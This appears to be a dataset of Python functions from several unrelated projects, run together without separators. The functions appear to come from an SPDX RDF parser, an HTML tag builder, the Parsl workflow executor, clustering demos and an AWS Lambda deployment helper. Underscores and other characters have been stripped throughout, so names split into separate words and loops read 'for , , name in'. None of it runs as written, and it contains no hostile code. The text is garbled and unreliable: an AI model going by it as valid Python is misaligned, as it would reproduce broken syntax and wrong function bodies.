def get extr lics comment ( self , extr lics ) : comment list = list ( self . graph . triples ( ( extr lics , RDFS . comment , None ) ) ) if len ( comment list ) > 1 : self . more than one error ( 'extracted license comment' ) return elif len ( comment list ) == 1 : return comment list [ 0 ] [ 2 ] else : return
def parse package ( self , p term ) : # Check there is a pacakge name if not ( p term , self . spdx namespace [ 'name' ] , None ) in self . graph : self . error = True self . logger . log ( 'Package must have a name.' ) # Create dummy package so that we may continue parsing the rest of # the package fields. self . builder . create package ( self . doc , 'dummy package' ) else : for s , p , o in self . graph . triples ( ( p term , self . spdx namespace [ 'name' ] , None ) ) : try : self . builder . create package ( self . doc , six . text type ( o ) ) except Cardinality Error : self . more than one error ( 'Package name' ) break self . p pkg vinfo ( p term , self . spdx namespace [ 'version Info' ] ) self . p pkg fname ( p term , self . spdx namespace [ 'package File Name' ] ) self . p pkg suppl ( p term , self . spdx namespace [ 'supplier' ] ) self . p pkg originator ( p term , self . spdx namespace [ 'originator' ] ) self . p pkg down loc ( p term , self . spdx namespace [ 'download Location' ] ) self . p pkg homepg ( p term , self . doap namespace [ 'homepage' ] ) self . p pkg chk sum ( p term , self . spdx namespace [ 'checksum' ] ) self . p pkg src info ( p term , self . spdx namespace [ 'source Info' ] ) self . p pkg verif code ( p term , self . spdx namespace [ 'package Verification Code' ] ) self . p pkg lic conc ( p term , self . spdx namespace [ 'license Concluded' ] ) self . p pkg lic decl ( p term , self . spdx namespace [ 'license Declared' ] ) self . p pkg lics info from files ( p term , self . spdx namespace [ 'license Info From Files' ] ) self . p pkg comments on lics ( p term , self . spdx namespace [ 'license Comments' ] ) self . p pkg cr text ( p term , self . spdx namespace [ 'copyright Text' ] ) self . p pkg summary ( p term , self . spdx namespace [ 'summary' ] ) self . p pkg descr ( p term , self . spdx namespace [ 'description' ] )
def handle pkg lic ( self , p term , predicate , builder func ) : try : for , , licenses in self . graph . triples ( ( p term , predicate , None ) ) : if ( licenses , RDF . type , self . spdx namespace [ 'Conjunctive License Set' ] ) in self . graph : lics = self . handle conjunctive list ( licenses ) builder func ( self . doc , lics ) elif ( licenses , RDF . type , self . spdx namespace [ 'Disjunctive License Set' ] ) in self . graph : lics = self . handle disjunctive list ( licenses ) builder func ( self . doc , lics ) else : try : lics = self . handle lics ( licenses ) builder func ( self . doc , lics ) except SPDX Value Error : self . value error ( 'PKG SINGLE LICS' , licenses ) except Cardinality Error : self . more than one error ( 'package {0}' . format ( predicate ) )
def get file name ( self , f term ) : for , , name in self . graph . triples ( ( f term , self . spdx namespace [ 'file Name' ] , None ) ) : return name return
def p file depends ( self , f term , predicate ) : for , , other file in self . graph . triples ( ( f term , predicate , None ) ) : name = self . get file name ( other file ) if name is not None : self . builder . add file dep ( six . text type ( name ) ) else : self . error = True msg = 'File depends on file with no name' self . logger . log ( msg )
def p file contributor ( self , f term , predicate ) : for , , contributor in self . graph . triples ( ( f term , predicate , None ) ) : self . builder . add file contribution ( self . doc , six . text type ( contributor ) )
def p file notice ( self , f term , predicate ) : try : for , , notice in self . graph . triples ( ( f term , predicate , None ) ) : self . builder . set file notice ( self . doc , six . text type ( notice ) ) except Cardinality Error : self . more than one error ( 'file notice' )
def p file comment ( self , f term , predicate ) : try : for , , comment in self . graph . triples ( ( f term , predicate , None ) ) : self . builder . set file comment ( self . doc , six . text type ( comment ) ) except Cardinality Error : self . more than one error ( 'file comment' )
def p file cr text ( self , f term , predicate ) : try : for , , cr text in self . graph . triples ( ( f term , predicate , None ) ) : self . builder . set file copyright ( self . doc , six . text type ( cr text ) ) except Cardinality Error : self . more than one error ( 'file copyright text' )
def p file comments on lics ( self , f term , predicate ) : try : for , , comment in self . graph . triples ( ( f term , predicate , None ) ) : self . builder . set file license comment ( self . doc , six . text type ( comment ) ) except Cardinality Error : self . more than one error ( 'file comments on license' )
def p file lic info ( self , f term , predicate ) : for , , info in self . graph . triples ( ( f term , predicate , None ) ) : lic = self . handle lics ( info ) if lic is not None : self . builder . set file license in file ( self . doc , lic )
def p file type ( self , f term , predicate ) : try : for , , ftype in self . graph . triples ( ( f term , predicate , None ) ) : try : if ftype . endswith ( 'binary' ) : ftype = 'BINARY' elif ftype . endswith ( 'source' ) : ftype = 'SOURCE' elif ftype . endswith ( 'other' ) : ftype = 'OTHER' elif ftype . endswith ( 'archive' ) : ftype = 'ARCHIVE' self . builder . set file type ( self . doc , ftype ) except SPDX Value Error : self . value error ( 'FILE TYPE' , ftype ) except Cardinality Error : self . more than one error ( 'file type' )
def p file chk sum ( self , f term , predicate ) : try : for s , p , checksum in self . graph . triples ( ( f term , predicate , None ) ) : for , , value in self . graph . triples ( ( checksum , self . spdx namespace [ 'checksum Value' ] , None ) ) : self . builder . set file chksum ( self . doc , six . text type ( value ) ) except Cardinality Error : self . more than one error ( 'File checksum' )
def p file lic conc ( self , f term , predicate ) : try : for , , licenses in self . graph . triples ( ( f term , predicate , None ) ) : if ( licenses , RDF . type , self . spdx namespace [ 'Conjunctive License Set' ] ) in self . graph : lics = self . handle conjunctive list ( licenses ) self . builder . set concluded license ( self . doc , lics ) elif ( licenses , RDF . type , self . spdx namespace [ 'Disjunctive License Set' ] ) in self . graph : lics = self . handle disjunctive list ( licenses ) self . builder . set concluded license ( self . doc , lics ) else : try : lics = self . handle lics ( licenses ) self . builder . set concluded license ( self . doc , lics ) except SPDX Value Error : self . value error ( 'FILE SINGLE LICS' , licenses ) except Cardinality Error : self . more than one error ( 'file {0}' . format ( predicate ) )
def parse creation info ( self , ci term ) : for s , p , o in self . graph . triples ( ( ci term , self . spdx namespace [ 'creator' ] , None ) ) : try : ent = self . builder . create entity ( self . doc , six . text type ( o ) ) self . builder . add creator ( self . doc , ent ) except SPDX Value Error : self . value error ( 'CREATOR VALUE' , o ) for s , p , o in self . graph . triples ( ( ci term , self . spdx namespace [ 'created' ] , None ) ) : try : self . builder . set created date ( self . doc , six . text type ( o ) ) except SPDX Value Error : self . value error ( 'CREATED VALUE' , o ) except Cardinality Error : self . more than one error ( 'created' ) break for s , p , o in self . graph . triples ( ( ci term , RDFS . comment , None ) ) : try : self . builder . set creation comment ( self . doc , six . text type ( o ) ) except Cardinality Error : self . more than one error ( 'Creation Info comment' ) break for s , p , o in self . graph . triples ( ( ci term , self . spdx namespace [ 'license List Version' ] , None ) ) : try : self . builder . set lics list ver ( self . doc , six . text type ( o ) ) except Cardinality Error : self . more than one error ( 'license List Version' ) break except SPDX Value Error : self . value error ( 'LL VALUE' , o )
def parse ext doc ref ( self , ext doc ref term ) : for s , p , o in self . graph . triples ( ( ext doc ref term , self . spdx namespace [ 'external Document Id' ] , None ) ) : try : self . builder . set ext doc id ( self . doc , six . text type ( o ) ) except SPDX Value Error : self . value error ( 'EXT DOC REF VALUE' , 'External Document ID' ) break for s , p , o in self . graph . triples ( ( ext doc ref term , self . spdx namespace [ 'spdx Document' ] , None ) ) : try : self . builder . set spdx doc uri ( self . doc , six . text type ( o ) ) except SPDX Value Error : self . value error ( 'EXT DOC REF VALUE' , 'SPDX Document URI' ) break for s , p , checksum in self . graph . triples ( ( ext doc ref term , self . spdx namespace [ 'checksum' ] , None ) ) : for , , value in self . graph . triples ( ( checksum , self . spdx namespace [ 'checksum Value' ] , None ) ) : try : self . builder . set chksum ( self . doc , six . text type ( value ) ) except SPDX Value Error : self . value error ( 'EXT DOC REF VALUE' , 'Checksum' ) break
def system ( cmd , data = None ) : import subprocess s = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stdin = subprocess . PIPE ) out , err = s . communicate ( data ) return out . decode ( 'utf8' )
def unescape ( data ) : cc = re . compile ( r'&(?:(?:#(\d+))|([^;]+));' ) result = [ ] m = cc . search ( data ) while m : result . append ( data [ 0 : m . start ( ) ] ) d = m . group ( 1 ) if d : d = int ( d ) result . append ( unichr ( d ) ) else : d = unescape . get ( m . group ( 2 ) , ord ( '?' ) ) result . append ( unichr ( d ) ) data = data [ m . end ( ) : ] m = cc . search ( data ) result . append ( data ) return '' . join ( result )
def attr ( * args , * * kwargs ) : ctx = dom tag . with contexts [ get thread context ( ) ] if ctx and ctx [ - 1 ] : dicts = args + ( kwargs , ) for d in dicts : for attr , value in d . items ( ) : ctx [ - 1 ] . tag . set attribute ( * dom tag . clean pair ( attr , value ) ) else : raise Value Error ( 'not in a tag context' )
def set attribute ( self , key , value ) : if isinstance ( key , int ) : self . children [ key ] = value elif isinstance ( key , basestring ) : self . attributes [ key ] = value else : raise Type Error ( 'Only integer and string types are valid for assigning ' 'child tags and attributes, respectively.' )
def add ( self , * args ) : for obj in args : if isinstance ( obj , numbers . Number ) : # Convert to string so we fall into next if block obj = str ( obj ) if isinstance ( obj , basestring ) : obj = escape ( obj ) self . children . append ( obj ) elif isinstance ( obj , dom tag ) : ctx = dom tag . with contexts [ get thread context ( ) ] if ctx and ctx [ - 1 ] : ctx [ - 1 ] . used . add ( obj ) self . children . append ( obj ) obj . parent = self obj . setdocument ( self . document ) elif isinstance ( obj , dict ) : for attr , value in obj . items ( ) : self . set attribute ( * dom tag . clean pair ( attr , value ) ) elif hasattr ( obj , ' iter ' ) : for subobj in obj : self . add ( subobj ) else : # wtf is it? raise Value Error ( '%r not a tag or string.' % obj ) if len ( args ) == 1 : return args [ 0 ] return args
def start ( self ) : self . outgoing q = zmq pipes . Tasks Outgoing ( "127.0.0.1" , self . interchange port range ) self . incoming q = zmq pipes . Results Incoming ( "127.0.0.1" , self . interchange port range ) self . is alive = True self . queue management thread = None self . start queue management thread ( ) self . start local queue process ( ) logger . debug ( "Created management thread: {}" . format ( self . queue management thread ) ) if self . provider : # debug opts = "--debug" if self.worker debug else "" l cmd = self . launch cmd . format ( # debug=debug opts, task url = self . worker task url , workers per node = self . workers per node , logdir = "{}/{}" . format ( self . run dir , self . label ) ) self . launch cmd = l cmd logger . debug ( "Launch command: {}" . format ( self . launch cmd ) ) self . scaling enabled = self . provider . scaling enabled logger . debug ( "Starting Low Latency Executor with provider:\n%s" , self . provider ) if hasattr ( self . provider , 'init blocks' ) : try : for i in range ( self . provider . init blocks ) : block = self . provider . submit ( self . launch cmd , 1 , self . workers per node ) logger . debug ( "Launched block {}:{}" . format ( i , block ) ) if not block : raise ( Scaling Failed ( self . provider . label , "Attempts to provision nodes via provider has failed" ) ) self . blocks . extend ( [ block ] ) except Exception as e : logger . error ( "Scaling out failed: {}" . format ( e ) ) raise e else : self . scaling enabled = False logger . debug ( "Starting Low Latency Executor with no provider" )
def create reg message ( self ) : msg = { 'parsl v' : PARSL VERSION , 'python v' : "{}.{}.{}" . format ( sys . version info . major , sys . version info . minor , sys . version info . micro ) , 'os' : platform . system ( ) , 'hname' : platform . node ( ) , 'dir' : os . getcwd ( ) , } b msg = json . dumps ( msg ) . encode ( 'utf-8' ) return b msg
def heartbeat ( self ) : heartbeat = ( HEARTBEAT CODE ) . to bytes ( 4 , "little" ) r = self . task incoming . send ( heartbeat ) logger . debug ( "Return from heartbeat : {}" . format ( r ) )
def async process ( fn ) : def run ( * args , * * kwargs ) : proc = mp . Process ( target = fn , args = args , kwargs = kwargs ) proc . start ( ) return proc return run
def send UDP message ( self , message ) : x = 0 if self . tracking enabled : try : proc = udp messenger ( self . domain name , self . UDP IP , self . UDP PORT , self . sock timeout , message ) self . procs . append ( proc ) except Exception as e : logger . debug ( "Usage tracking failed: {}" . format ( e ) ) else : x = - 1 return x
def create task log info ( self , task id , fail mode = None ) : info to monitor = [ 'func name' , 'fn hash' , 'memoize' , 'checkpoint' , 'fail count' , 'fail history' , 'status' , 'id' , 'time submitted' , 'time returned' , 'executor' ] task log info = { "task " + k : self . tasks [ task id ] [ k ] for k in info to monitor } task log info [ 'run id' ] = self . run id task log info [ 'timestamp' ] = datetime . datetime . now ( ) task log info [ 'task status name' ] = self . tasks [ task id ] [ 'status' ] . name task log info [ 'tasks failed count' ] = self . tasks failed count task log info [ 'tasks completed count' ] = self . tasks completed count task log info [ 'task inputs' ] = str ( self . tasks [ task id ] [ 'kwargs' ] . get ( 'inputs' , None ) ) task log info [ 'task outputs' ] = str ( self . tasks [ task id ] [ 'kwargs' ] . get ( 'outputs' , None ) ) task log info [ 'task stdin' ] = self . tasks [ task id ] [ 'kwargs' ] . get ( 'stdin' , None ) task log info [ 'task stdout' ] = self . tasks [ task id ] [ 'kwargs' ] . get ( 'stdout' , None ) task log info [ 'task depends' ] = None if self . tasks [ task id ] [ 'depends' ] is not None : task log info [ 'task depends' ] = "," . join ( [ str ( t . tid ) for t in self . tasks [ task id ] [ 'depends' ] ] ) task log info [ 'task elapsed time' ] = None if self . tasks [ task id ] [ 'time returned' ] is not None : task log info [ 'task elapsed time' ] = ( self . tasks [ task id ] [ 'time returned' ] - self . tasks [ task id ] [ 'time submitted' ] ) . total seconds ( ) if fail mode is not None : task log info [ 'task fail mode' ] = fail mode return task log info
def command server ( self , kill event ) : logger . debug ( "[COMMAND] Command Server Starting" ) while not kill event . is set ( ) : try : command req = self . command channel . recv pyobj ( ) logger . debug ( "[COMMAND] Received command request: {}" . format ( command req ) ) if command req == "OUTSTANDING C" : outstanding = self . pending task queue . qsize ( ) for manager in self . ready manager queue : outstanding += len ( self . ready manager queue [ manager ] [ 'tasks' ] ) reply = outstanding elif command req == "WORKERS" : num workers = 0 for manager in self . ready manager queue : num workers += self . ready manager queue [ manager ] [ 'worker count' ] reply = num workers elif command req == "MANAGERS" : reply = [ ] for manager in self . ready manager queue : resp = { 'manager' : manager . decode ( 'utf-8' ) , 'block id' : self . ready manager queue [ manager ] [ 'block id' ] , 'worker count' : self . ready manager queue [ manager ] [ 'worker count' ] , 'tasks' : len ( self . ready manager queue [ manager ] [ 'tasks' ] ) , 'active' : self . ready manager queue [ manager ] [ 'active' ] } reply . append ( resp ) elif command req . startswith ( "HOLD WORKER" ) : cmd , s manager = command req . split ( ';' ) manager = s manager . encode ( 'utf-8' ) logger . info ( "[CMD] Received HOLD WORKER for {}" . format ( manager ) ) if manager in self . ready manager queue : self . ready manager queue [ manager ] [ 'active' ] = False reply = True else : reply = False elif command req == "SHUTDOWN" : logger . info ( "[CMD] Received SHUTDOWN command" ) kill event . set ( ) reply = True else : reply = None logger . debug ( "[COMMAND] Reply: {}" . format ( reply ) ) self . command channel . send pyobj ( reply ) except zmq . Again : logger . debug ( "[COMMAND] is alive" ) continue
def get data manager ( cls ) : from parsl . dataflow . dflow import Data Flow Kernel Loader dfk = Data Flow Kernel Loader . dfk ( ) return dfk . executors [ 'data manager' ]
def import mapping ( mapping , original = None ) : #log = get logger() #log.debug("Importing canning map") for key , value in list ( mapping . items ( ) ) : if isinstance ( key , string types ) : try : cls = import item ( key ) except Exception : if original and key not in original : # only message on user-added classes # log.error("canning class not importable: %r", key, exc info=True) print ( "ERROR: canning class not importable: %r" , key , exc info = True ) mapping . pop ( key ) else : mapping [ cls ] = mapping . pop ( key )
def can ( obj ) : import needed = False for cls , canner in iteritems ( can map ) : if isinstance ( cls , string types ) : import needed = True break elif istype ( obj , cls ) : return canner ( obj ) if import needed : # perform can map imports, then try again # this will usually only happen once import mapping ( can map , original can map ) return can ( obj ) return obj
def can dict ( obj ) : if istype ( obj , dict ) : newobj = { } for k , v in iteritems ( obj ) : newobj [ k ] = can ( v ) return newobj else : return obj
def can sequence ( obj ) : if istype ( obj , sequence types ) : t = type ( obj ) return t ( [ can ( i ) for i in obj ] ) else : return obj
def unset logging ( self ) : if self . logger flag is True : return root logger = logging . get Logger ( ) for hndlr in root logger . handlers : if hndlr not in self . prior loghandlers : hndlr . set Level ( logging . ERROR ) self . logger flag = True
def start ( self ) : if self . mode == "manual" : return if self . ipython dir != '~/.ipython' : self . ipython dir = os . path . abspath ( os . path . expanduser ( self . ipython dir ) ) if self . log : stdout = open ( os . path . join ( self . ipython dir , "{0}.controller.out" . format ( self . profile ) ) , 'w' ) stderr = open ( os . path . join ( self . ipython dir , "{0}.controller.err" . format ( self . profile ) ) , 'w' ) else : stdout = open ( os . devnull , 'w' ) stderr = open ( os . devnull , 'w' ) try : opts = [ 'ipcontroller' , '' if self . ipython dir == '~/.ipython' else '--ipython-dir={}' . format ( self . ipython dir ) , self . interfaces if self . interfaces is not None else '--ip=*' , '' if self . profile == 'default' else '--profile={0}' . format ( self . profile ) , '--reuse' if self . reuse else '' , '--location={}' . format ( self . public ip ) if self . public ip else '' , '--port={}' . format ( self . port ) if self . port is not None else '' ] if self . port range is not None : opts += [ '--Hub Factory.hb={0},{1}' . format ( self . hb ping , self . hb pong ) , '--Hub Factory.control={0},{1}' . format ( self . control client , self . control engine ) , '--Hub Factory.mux={0},{1}' . format ( self . mux client , self . mux engine ) , '--Hub Factory.task={0},{1}' . format ( self . task client , self . task engine ) ] logger . debug ( "Starting ipcontroller with '{}'" . format ( ' ' . join ( [ str ( x ) for x in opts ] ) ) ) self . proc = subprocess . Popen ( opts , stdout = stdout , stderr = stderr , preexec fn = os . setsid ) except File Not Found Error : msg = "Could not find ipcontroller. Please make sure that ipyparallel is installed and available in your env" logger . error ( msg ) raise Controller Error ( msg ) except Exception as e : msg = "IPP Controller failed to start: {0}" . format ( e ) logger . error ( msg ) raise Controller Error ( msg )
def nbytes ( buf ) : if isinstance ( buf , memoryview ) : if PY3 : # py3 introduces nbytes attribute return buf . nbytes else : # compute nbytes on py2 size = buf . itemsize for dim in buf . shape : size *= dim return size else : # not a memoryview, raw bytes/ py2 buffer return len ( buf )
def extract buffers ( obj , threshold = MAX BYTES ) : buffers = [ ] if isinstance ( obj , Canned Object ) and obj . buffers : for i , buf in enumerate ( obj . buffers ) : nbytes = nbytes ( buf ) if nbytes > threshold : # buffer larger than threshold, prevent pickling obj . buffers [ i ] = None buffers . append ( buf ) # buffer too small for separate send, coerce to bytes # because pickling buffer objects just results in broken pointers elif isinstance ( buf , memoryview ) : obj . buffers [ i ] = buf . tobytes ( ) elif isinstance ( buf , buffer ) : obj . buffers [ i ] = bytes ( buf ) return buffers
def restore buffers ( obj , buffers ) : if isinstance ( obj , Canned Object ) and obj . buffers : for i , buf in enumerate ( obj . buffers ) : if buf is None : obj . buffers [ i ] = buffers . pop ( 0 )
def initialize boto client ( self ) : self . session = self . create session ( ) self . client = self . session . client ( 'ec2' ) self . ec2 = self . session . resource ( 'ec2' ) self . instances = [ ] self . instance states = { } self . vpc id = 0 self . sg id = 0 self . sn ids = [ ]
def get instance state ( self , instances = None ) : if instances : desc = self . client . describe instances ( Instance Ids = instances ) else : desc = self . client . describe instances ( Instance Ids = self . instances ) # pprint.pprint(desc['Reservations'],indent=4) for i in range ( len ( desc [ 'Reservations' ] ) ) : instance = desc [ 'Reservations' ] [ i ] [ 'Instances' ] [ 0 ] self . instance states [ instance [ 'Instance Id' ] ] = instance [ 'State' ] [ 'Name' ] return self . instance states
def show summary ( self ) : self . get instance state ( ) status string = . format ( self . vpc id , self . sn ids , self . sg id , self . instances ) status string += "\t Instance States:\n\t\t" self . get instance state ( ) for state in self . instance states . keys ( ) : status string += "Instance ID: {}  State: {}\n\t\t" . format ( state , self . instance states [ state ] ) status string += "\n" logger . info ( status string ) return status string
def scale out ( self , blocks = 1 , block size = 1 ) : self . config [ 'sites.jetstream.{0}' . format ( self . pool ) ] [ 'flavor' ] count = 0 if blocks == 1 : block id = len ( self . blocks ) self . blocks [ block id ] = [ ] for instance id in range ( 0 , block size ) : instances = self . server manager . create ( 'parsl-{0}-{1}' . format ( block id , instance id ) , # Name self . client . images . get ( '87e08a17-eae2-4ce4-9051-c561d9a54bde' ) , # Image id self . client . flavors . list ( ) [ 0 ] , min count = 1 , max count = 1 , userdata = setup script . format ( engine config = self . engine config ) , key name = 'TG-MCB090174-api-key' , security groups = [ 'global-ssh' ] , nics = [ { "net-id" : '724a50cf-7f11-4b3b-a884-cd7e6850e39e' , "net-name" : 'PARSL-priv-net' , "v4-fixed-ip" : '' } ] ) self . blocks [ block id ] . extend ( [ instances ] ) count += 1 return count
def status ( self ) : job id list = ' ' . join ( self . resources . keys ( ) ) cmd = "condor q {0} -af:jr Job Status" . format ( job id list ) retcode , stdout , stderr = super ( ) . execute wait ( cmd ) for line in stdout . strip ( ) . split ( '\n' ) : parts = line . split ( ) job id = parts [ 0 ] status = translate table . get ( parts [ 1 ] , 'UNKNOWN' ) self . resources [ job id ] [ 'status' ] = status
def scale in ( self , blocks ) : status = dict ( zip ( self . engines , self . provider . status ( self . engines ) ) ) # This works for blocks=0 to kill = [ engine for engine in status if status [ engine ] == "RUNNING" ] [ : blocks ] if self . provider : r = self . provider . cancel ( to kill ) else : logger . error ( "No execution provider available" ) r = None return r
def status ( self ) : if self . provider : status = self . provider . status ( self . engines ) else : status = [ ] return status
def shutdown ( self ) : self . is alive = False logging . debug ( "Waking management thread" ) self . incoming q . put ( None ) # Wake up the thread self . queue management thread . join ( ) # Force join logging . debug ( "Exiting thread" ) self . worker . join ( ) return True
def notify ( self , event id ) : self . event buffer . extend ( [ event id ] ) self . event count += 1 if self . event count >= self . threshold : logger . debug ( "Eventcount >= threshold" ) self . make callback ( kind = "event" )
def make callback ( self , kind = None ) : self . wake up time = time . time ( ) + self . interval self . callback ( * self . cb args )
def create deployment ( self , deployment ) : api response = self . kube client . create namespaced deployment ( body = deployment , namespace = self . namespace ) logger . debug ( "Deployment created. status='{0}'" . format ( str ( api response . status ) ) )
def start ( self ) : self . outgoing q = zmq pipes . Tasks Outgoing ( "127.0.0.1" , self . interchange port range ) self . incoming q = zmq pipes . Results Incoming ( "127.0.0.1" , self . interchange port range ) self . command client = zmq pipes . Command Client ( "127.0.0.1" , self . interchange port range ) self . is alive = True self . executor bad state = threading . Event ( ) self . executor exception = None self . queue management thread = None self . start queue management thread ( ) self . start local queue process ( ) logger . debug ( "Created management thread: {}" . format ( self . queue management thread ) ) if self . provider : self . initialize scaling ( ) else : self . scaling enabled = False logger . debug ( "Starting High Throughput Executor with no provider" )
def status ( self ) : status = [ ] if self . provider : status = self . provider . status ( self . blocks . values ( ) ) return status
def thirteen oscillator three stimulated ensembles list ( ) : "Not accurate due to false skipes are observed" parameters = legion parameters ( ) parameters . Wt = 4.0 parameters . fi = 10.0 template dynamic legion ( 15 , 1000 , 1000 , conn type = conn type . LIST BIDIR , stimulus = [ 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 1 ] , params = parameters , separate repr = [ [ 0 , 1 , 2 ] , [ 3 , 4 , 5 , 9 , 10 ] , [ 6 , 7 , 8 ] , [ 11 , 12 , 13 , 14 ] ] )
def thirteen simplify oscillator three stimulated ensembles list ( ) : "Not accurate due to false skipes are observed" parameters = legion parameters ( ) parameters . Wt = 4.0 parameters . fi = 0.8 parameters . ENABLE POTENTIONAL = False template dynamic legion ( 15 , 1000 , 1000 , conn type = conn type . LIST BIDIR , stimulus = [ 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 1 ] , params = parameters , separate repr = [ [ 0 , 1 , 2 ] , [ 3 , 4 , 5 , 9 , 10 ] , [ 6 , 7 , 8 ] , [ 11 , 12 , 13 , 14 ] ] )
def sixteen oscillator two stimulated ensembles grid ( ) : parameters = legion parameters ( ) parameters . teta x = - 1.1 template dynamic legion ( 16 , 2000 , 1500 , conn type = conn type . GRID FOUR , params = parameters , stimulus = [ 1 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 ] )
def cluster sample1 ( ) : start centers = [ [ 3.7 , 5.5 ] ] template clustering ( start centers , SIMPLE SAMPLES . SAMPLE SIMPLE1 , criterion = splitting type . BAYESIAN INFORMATION CRITERION ) template clustering ( start centers , SIMPLE SAMPLES . SAMPLE SIMPLE1 , criterion = splitting type . MINIMUM NOISELESS DESCRIPTION LENGTH )
def cluster sample2 ( ) : start centers = [ [ 3.5 , 4.8 ] , [ 2.6 , 2.5 ] ] template clustering ( start centers , SIMPLE SAMPLES . SAMPLE SIMPLE2 , criterion = splitting type . BAYESIAN INFORMATION CRITERION ) template clustering ( start centers , SIMPLE SAMPLES . SAMPLE SIMPLE2 , criterion = splitting type . MINIMUM NOISELESS DESCRIPTION LENGTH )
def cluster sample3 ( ) : start centers = [ [ 0.2 , 0.1 ] , [ 4.0 , 1.0 ] ] template clustering ( start centers , SIMPLE SAMPLES . SAMPLE SIMPLE3 , criterion = splitting type . BAYESIAN INFORMATION CRITERION ) template clustering ( start centers , SIMPLE SAMPLES . SAMPLE SIMPLE3 , criterion = splitting type . MINIMUM NOISELESS DESCRIPTION LENGTH )
def cluster sample5 ( ) : start centers = [ [ 0.0 , 1.0 ] , [ 0.0 , 0.0 ] ] template clustering ( start centers , SIMPLE SAMPLES . SAMPLE SIMPLE5 , criterion = splitting type . BAYESIAN INFORMATION CRITERION ) template clustering ( start centers , SIMPLE SAMPLES . SAMPLE SIMPLE5 , criterion = splitting type . MINIMUM NOISELESS DESCRIPTION LENGTH )
def cluster elongate ( ) : start centers = [ [ 1.0 , 4.5 ] , [ 3.1 , 2.7 ] ] template clustering ( start centers , SIMPLE SAMPLES . SAMPLE ELONGATE , criterion = splitting type . BAYESIAN INFORMATION CRITERION ) template clustering ( start centers , SIMPLE SAMPLES . SAMPLE ELONGATE , criterion = splitting type . MINIMUM NOISELESS DESCRIPTION LENGTH )
def cluster lsun ( ) : start centers = [ [ 1.0 , 3.5 ] , [ 2.0 , 0.5 ] , [ 3.0 , 3.0 ] ] template clustering ( start centers , FCPS SAMPLES . SAMPLE LSUN , criterion = splitting type . BAYESIAN INFORMATION CRITERION ) template clustering ( start centers , FCPS SAMPLES . SAMPLE LSUN , criterion = splitting type . MINIMUM NOISELESS DESCRIPTION LENGTH )
def cluster target ( ) : start centers = [ [ 0.2 , 0.2 ] , [ 0.0 , - 2.0 ] , [ 3.0 , - 3.0 ] , [ 3.0 , 3.0 ] , [ - 3.0 , 3.0 ] , [ - 3.0 , - 3.0 ] ] template clustering ( start centers , FCPS SAMPLES . SAMPLE TARGET , criterion = splitting type . BAYESIAN INFORMATION CRITERION ) template clustering ( start centers , FCPS SAMPLES . SAMPLE TARGET , criterion = splitting type . MINIMUM NOISELESS DESCRIPTION LENGTH )
def cluster two diamonds ( ) : start centers = [ [ 0.8 , 0.2 ] ] template clustering ( start centers , FCPS SAMPLES . SAMPLE TWO DIAMONDS , criterion = splitting type . BAYESIAN INFORMATION CRITERION ) template clustering ( start centers , FCPS SAMPLES . SAMPLE TWO DIAMONDS , criterion = splitting type . MINIMUM NOISELESS DESCRIPTION LENGTH )
def cluster hepta ( ) : start centers = [ [ 0.0 , 0.0 , 0.0 ] , [ 3.0 , 0.0 , 0.0 ] , [ - 2.0 , 0.0 , 0.0 ] , [ 0.0 , 3.0 , 0.0 ] , [ 0.0 , - 3.0 , 0.0 ] , [ 0.0 , 0.0 , 2.5 ] ] template clustering ( start centers , FCPS SAMPLES . SAMPLE HEPTA , criterion = splitting type . BAYESIAN INFORMATION CRITERION ) template clustering ( start centers , FCPS SAMPLES . SAMPLE HEPTA , criterion = splitting type . MINIMUM NOISELESS DESCRIPTION LENGTH )
def get role name ( region , account id , role ) : prefix = ARN PREFIXES . get ( region , 'aws' ) return 'arn:{0}:iam::{1}:role/{2}' . format ( prefix , account id , role )
def get account id ( profile name , aws access key id , aws secret access key , region = None , ) : client = get client ( 'sts' , profile name , aws access key id , aws secret access key , region , ) return client . get caller identity ( ) . get ( 'Account' )
def get client ( client , profile name , aws access key id , aws secret access key , region = None , ) : boto3 . setup default session ( profile name = profile name , aws access key id = aws access key id , aws secret access key = aws secret access key , region name = region , ) return boto3 . client ( client )
def create function ( cfg , path to zip file , use s3 = False , s3 file = None ) : print ( 'Creating your new Lambda function' ) byte stream = read ( path to zip file , binary file = True ) profile name = cfg . get ( 'profile' ) aws access key id = cfg . get ( 'aws access key id' ) aws secret access key = cfg . get ( 'aws secret access key' ) account id = get account id ( profile name , aws access key id , aws secret access key , cfg . get ( 'region' , ) , ) role = get role name ( cfg . get ( 'region' ) , account id , cfg . get ( 'role' , 'lambda basic execution' ) , ) client = get client ( 'lambda' , profile name , aws access key id , aws secret access key , cfg . get ( 'region' ) , ) # Do we prefer development variable over config? buck name = ( os . environ . get ( 'S3 BUCKET NAME' ) or cfg . get ( 'bucket name' ) ) func name = ( os . environ . get ( 'LAMBDA FUNCTION NAME' ) or cfg . get ( 'function name' ) ) print ( 'Creating lambda function with name: {}' . format ( func name ) ) if use s3 : kwargs = { 'Function Name' : func name , 'Runtime' : cfg . get ( 'runtime' , 'python2.7' ) , 'Role' : role , 'Handler' : cfg . get ( 'handler' ) , 'Code' : { 'S3Bucket' : '{}' . format ( buck name ) , 'S3Key' : '{}' . format ( s3 file ) , } , 'Description' : cfg . get ( 'description' , '' ) , 'Timeout' : cfg . get ( 'timeout' , 15 ) , 'Memory Size' : cfg . get ( 'memory size' , 512 ) , 'Vpc Config' : { 'Subnet Ids' : cfg . get ( 'subnet ids' , [ ] ) , 'Security Group Ids' : cfg . get ( 'security group ids' , [ ] ) , } , 'Publish' : True , } else : kwargs = { 'Function Name' : func name , 'Runtime' : cfg . get ( 'runtime' , 'python2.7' ) , 'Role' : role , 'Handler' : cfg . get ( 'handler' ) , 'Code' : { 'Zip File' : byte stream } , 'Description' : cfg . get ( 'description' , '' ) , 'Timeout' : cfg . get ( 'timeout' , 15 ) , 'Memory Size' : cfg . get ( 'memory size' , 512 ) , 'Vpc Config' : { 'Subnet Ids' : cfg . get ( 'subnet ids' , [ ] ) , 'Security Group Ids' : cfg . get ( 'security group ids' , [ ] ) , } , 'Publish' : True , } if 'tags' in cfg : kwargs . update ( Tags = { key : str ( value ) for key , value in cfg . get ( 'tags' ) . items ( ) } ) if 'environment variables' in cfg : kwargs . update ( Environment = { 